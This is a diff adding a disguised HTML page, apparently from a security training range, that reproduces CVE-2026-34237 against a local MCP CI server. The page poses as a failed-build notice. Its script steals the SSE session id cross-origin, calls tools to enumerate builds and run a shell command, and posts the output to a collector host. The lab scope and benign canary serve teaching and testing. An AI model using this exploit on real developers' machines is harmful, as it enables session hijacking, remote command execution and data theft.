@@ -1,0 +1,88 @@
+<!doctype html>
+<!--
+  index.html - the attacker's drive-by page (Meridian Range · module 01 · CVE-2026-34237).
+
+  LAB-ONLY and SEALED BY DEFAULT. Models the page at http://attacker.lab.consulereit.nl that a developer opens in a
+  browser sitting next to their vulnerable Meridian CI (buildbot-mcp) MCP server. It runs a BENIGN
+  canary only and posts the result to the labnet-internal collector - nothing leaves the lab
+  (SCOPE #2/#4). The headless equivalent is modules/01-cors-session-hijack/scenario.ts.
+
+  FAITHFUL TO CVE-2026-34237. The affected MCP Java SDK transport answers the cross-origin SSE read
+  with Access-Control-Allow-Origin: *, so this page can:
+    1. READ the SSE `endpoint` event and lift the session id it discloses. `new EventSource(...)` is a
+       CORS-simple GET; the wildcard ACAO is what lets a foreign Origin read the body.
+    2. RELAY JSON-RPC as CORS-simple `text/plain` POSTs to `/mcp/message?sessionId=...` - no preflight -
+       and read each response back off the same SSE stream. The browser blocks reading the (CORS-less)
+       POST response, but the request is delivered and the JSON-RPC result arrives on the stream.
+  No exposed session header, no custom transport - the exact request sequence of the advisory.
+-->
+<meta charset="utf-8" />
+<title>Meridian CI · build #4209</title>
+<style>
+  body { font: 14px/1.5 system-ui, sans-serif; max-width: 640px; margin: 40px auto; color: #1c2530; }
+  .hdr { color: #b00020; font-weight: 600; }
+  .card { border: 1px solid #e3e8ee; border-radius: 8px; padding: 16px 20px; }
+  code { background: #f5f7fa; padding: 1px 5px; border-radius: 4px; }
+  #log { display: none; } /* the victim never needs to see the attack transcript */
+</style>
+<div class="card">
+  <p class="hdr">✗ nightly-e2e · build #4209 failed</p>
+  <p><b>main</b> @ <code>b90aa11</code> - e2e: checkout → pay flow timed out after 30000ms.</p>
+  <p>42 passed · 1 failing. This is a shared status link; sign in to Meridian CI to re-run.</p>
+</div>
+<pre id="log"></pre>
+<script>
+  // In the wild this is the developer's local server (e.g. http://127.0.0.1:8080); in the sealed lab it
+  // is the labnet service. Both speak the affected SDK's HTTP/SSE transport.
+  const TARGET = "http://mcp.lab.consulereit.nl:8080";
+  const SSE = TARGET + "/mcp/sse";
+  const COLLECTOR = "http://collector.lab.consulereit.nl:9000/pwned";
+  const CANARY = "id; hostname; echo LAB_CANARY_$$"; // benign proof-of-exec only
+  const log = (m) => (document.getElementById("log").textContent += m + "\n");
+
+  const pending = new Map();
+  let messageUrl = null, sessionId = null, nextId = 1, driven = false;
+
+  // ① CORS-simple cross-origin SSE read. ACAO:* lets this foreign Origin read the stream, including
+  //    the `endpoint` event that discloses the session id.
+  const es = new EventSource(SSE);
+  es.addEventListener("endpoint", (e) => {
+    messageUrl = new URL(e.data, SSE).toString();
+    sessionId = new URL(messageUrl).searchParams.get("sessionId");
+    log("stole session id: " + sessionId);
+    drive();
+  });
+  es.addEventListener("message", (e) => {
+    try {
+      const m = JSON.parse(e.data);
+      if (m.id != null && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); }
+    } catch {}
+  });
+
+  // ② relay JSON-RPC as a CORS-simple text/plain POST (no preflight). The response is not CORS-readable,
+  //    but the request is delivered and the JSON-RPC result comes back on the SSE stream above.
+  const post = (body) =>
+    fetch(messageUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) }).catch(() => {});
+  const rpc = (method, params) =>
+    new Promise((resolve) => { const id = nextId++; pending.set(id, resolve); post({ jsonrpc: "2.0", id, method, params }); });
+
+  async function drive() {
+    if (driven) return; driven = true;
+    await rpc("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" } });
+    post({ jsonrpc: "2.0", method: "notifications/initialized" });
+
+    // recon through the hijacked session - enumerate the victim's CI state (looks like normal traffic).
+    const builds = await rpc("tools/call", { name: "list_builds", arguments: {} });
+    log("recon (list_builds):\n" + (builds.result?.content?.[0]?.text ?? ""));
+
+    // drive the privileged build-step tool with the stolen session.
+    const out = (await rpc("tools/call", { name: "run_command", arguments: { cmd: CANARY } })).result?.content?.[0]?.text ?? "";
+    log("exec output:\n" + out);
+
+    // exfil to the attacker collector (text/plain keeps it CORS-simple; labnet-internal sink).
+    fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
+      body: JSON.stringify({ module: "01-cors-hijack", sessionId, output: out }) }).catch(() => {});
+    log("exfiltrated ✓");
+    es.close();
+  }
+</script>
